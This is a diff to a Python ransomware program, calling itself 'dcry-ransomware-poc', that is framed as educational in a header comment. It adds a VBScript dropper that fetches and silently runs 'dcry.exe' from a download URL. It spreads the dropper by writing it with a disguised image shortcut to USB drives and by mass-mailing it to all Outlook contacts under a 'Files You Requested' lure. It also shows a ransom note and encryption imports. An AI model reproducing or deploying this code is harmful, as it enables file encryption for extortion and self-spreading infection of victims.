@@ -9,35 +9,35 @@
 # under supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
+import base64
+import ctypes
+import getpass
+import hashlib
 import os
 import re
+import string
+import subprocess
 import sys
 import time
 import uuid
-import zlib
-import psutil
-import base64
-import string
 import winreg
-import ctypes
-import shutil
-import getpass
-import hashlib
-import subprocess
-from datetime import datetime
+import zlib
 from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
 
+import psutil
 import py7zr
 import requests
 import winshell
-from edx42 import dx42  # type: ignore
 from Crypto.Cipher import AES  # hidden import
-from Crypto.PublicKey import RSA
-from win32com.client import Dispatch
-from file_crypto import encrypt_file  # type: ignore
 from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
-from zeroize import zeroize1, mlock, munlock
+from file_crypto import encrypt_file  # type: ignore
+from win32com.client import Dispatch
+from zeroize import mlock, munlock, zeroize1
+
+from edx42 import dx42  # type: ignore
 
 # Decode the encoded URL using the dx42 function.
 YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode() # Replace with your encoded URL
@@ -46,6 +46,7 @@ YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode() # Replace with your encoded URL
 YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
 YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
+YOUR_DOWNLOAD_URL = dx42(b"YOUR_ENCODED_DOWNLOAD_URL").decode()
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
@@ -519,7 +520,7 @@ To get them back, please follow the instructions below.
 - The price will double if you don't pay within 24 hours.
 - All your files will become permanently encrypted and unrecoverable if you don't pay within 3 days!!!
 
-Don't Cry, just pay =}}"""
+Don't Cry, just pay =)))"""
     file_path = os.path.join(
         rf"C:\Users\{getpass.getuser()}", r"Desktop\DCRY_README.txt"
     )
@@ -693,8 +694,7 @@ def is_debugger_present():
 
 
 def infect_usb():
-    worm_path = os.path.abspath(sys.executable)
-    exe_name = "IMG_4599.jpg.exe"
+    vbs_name = "IMG_4599.jpg.vbs"
     lnk_name = "IMG_4599.jpg.lnk"
     for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
         usb_root = f"{letter}:\\"
@@ -703,45 +703,108 @@ def infect_usb():
                 os.path.exists(usb_root)
                 and ctypes.windll.kernel32.GetDriveTypeW(f"{usb_root}") == 2
             ):
-                exe_full = os.path.join(usb_root, exe_name)
+                vbs_full = os.path.join(usb_root, vbs_name)
                 lnk_full = os.path.join(usb_root, lnk_name)
 
-                shutil.copy2(worm_path, exe_full)
+                with open(vbs_full, "w") as f:
+                    f.write(f"""Option Explicit
 
-                os.system(f'attrib +h +s "{exe_full}"')
+Dim url, filename, tempFolder, fullPath
+Dim wsh, xhr, ado
+
+url = "{YOUR_DOWNLOAD_URL}"
+filename = "dcry.exe"
+
+Set wsh = CreateObject("WScript.Shell")
+tempFolder = wsh.ExpandEnvironmentStrings("%TEMP%")
+fullPath = tempFolder & "\\" & filename
+
+On Error Resume Next
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", url, False
+xhr.Send
+
+If xhr.Status = 200 Then
+    Set ado = CreateObject("ADODB.Stream")
+    ado.Type = 1
+    ado.Open
+    ado.Write xhr.ResponseBody
+    ado.Position = 0
+    ado.SaveToFile fullPath, 2
+    ado.Close
+End If
+
+wsh.Run Chr(34) & fullPath & Chr(34), 0, False
+
+On Error GoTo 0
+If Not ado Is Nothing Then Set ado = Nothing
+If Not xhr Is Nothing Then Set xhr = Nothing
+If Not wsh Is Nothing Then Set wsh = Nothing
+""")
+
+                os.system(f'attrib +h +s "{vbs_full}"')
             shortcut_path = lnk_full
             shell = Dispatch("WScript.Shell")
             shortcut = shell.CreateShortCut(shortcut_path)
-            shortcut.TargetPath = exe_full
+            shortcut.TargetPath = vbs_full
             shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
             shortcut.save()
-        except Exception as e:
+        except Exception:
             pass
 
 
 def send_email(zip_password="dcry-ransomware-poc"):
-    worm_path = os.path.abspath(sys.executable)
     temp_dir = os.getenv("TEMP")
-    exe_name = "IMG_4599.jpg.exe"
     lnk_name = "IMG_4599.jpg.lnk"
-    bat_name = "IMG_4599.jpg.bat"
-    exe_full = os.path.join(temp_dir, exe_name)
+    vbs_name = "IMG_4599.jpg.vbs"
     lnk_full = os.path.join(temp_dir, lnk_name)
-    bat_full = os.path.join(temp_dir, bat_name)
-    shutil.copy2(worm_path, exe_full)
-    os.system(f'attrib +h +s "{exe_full}"')
-    with open(bat_full, "w") as f:
-        f.write(f'@echo off\n"%~dp0{exe_name}"\n')
-    os.system(f'attrib +h +s "{bat_full}"')
+    vbs_full = os.path.join(temp_dir, vbs_name)
+    with open(vbs_full, "w") as f:
+        f.write(f"""Option Explicit
+
+Dim url, filename, tempFolder, fullPath
+Dim wsh, xhr, ado
+
+url = "{YOUR_DOWNLOAD_URL}"
+filename = "dcry.exe"
+
+Set wsh = CreateObject("WScript.Shell")
+tempFolder = wsh.ExpandEnvironmentStrings("%TEMP%")
+fullPath = tempFolder & "\\" & filename
+
+On Error Resume Next
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", url, False
+xhr.Send
+
+If xhr.Status = 200 Then
+    Set ado = CreateObject("ADODB.Stream")
+    ado.Type = 1
+    ado.Open
+    ado.Write xhr.ResponseBody
+    ado.Position = 0
+    ado.SaveToFile fullPath, 2
+    ado.Close
+End If
+
+wsh.Run Chr(34) & fullPath & Chr(34), 0, False
+
+On Error GoTo 0
+If Not ado Is Nothing Then Set ado = Nothing
+If Not xhr Is Nothing Then Set xhr = Nothing
+If Not wsh Is Nothing Then Set wsh = Nothing
+""")
+    os.system(f'attrib +h +s "{vbs_full}"')
+    os.system(f'attrib +h +s "{lnk_full}"')
     shell = Dispatch("WScript.Shell")
     shortcut = shell.CreateShortCut(lnk_full)
-    shortcut.TargetPath = bat_full
+    shortcut.TargetPath = vbs_full
     shortcut.IconLocation = r"%SystemRoot%\System32\SHELL32.dll,324"
     shortcut.WindowStyle = 7
     shortcut.save()
     zip_file_path = os.path.join(temp_dir, f"IMG_4599.7z")
     with py7zr.SevenZipFile(zip_file_path, mode="w", password=zip_password) as archive:
-        archive.write(exe_full, arcname=exe_name)
+        archive.write(vbs_full, arcname=vbs_name)
         archive.write(lnk_full, arcname=lnk_name)
     vbs_code = f"""
 dim x
@@ -755,18 +818,18 @@ For x=1 To ae.Count
     Set ci=ol.CreateItem(0)
     Set Mail=ci
     Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
-    Mail.Subject = "Hey, is that you?!"
-    Mail.Body = "Oh no... that has got to be embarrassing!!! Extraction password: {zip_password}"
+    Mail.Subject = "Files You Requested"
+    Mail.Body = "Here is the requested document - use this password to extract the attached ZIP file: {zip_password}"
     Mail.Attachments.Add("{zip_file_path}")
     Mail.send
 Next
 ol.Quit
-"""
+""" # I don't know if it works anymore =)))
     vbs_file_path = os.path.join(temp_dir, "mail.vbs")
     with open(vbs_file_path, "w") as f:
         f.write(vbs_code)
     os.system(f'start /b "" "{vbs_file_path}"')
-    files = [vbs_file_path, zip_file_path, exe_full, lnk_full]
+    files = [vbs_file_path, zip_file_path, vbs_full, lnk_full]
     for file in files:
         try:
             with open(file, "w") as f:
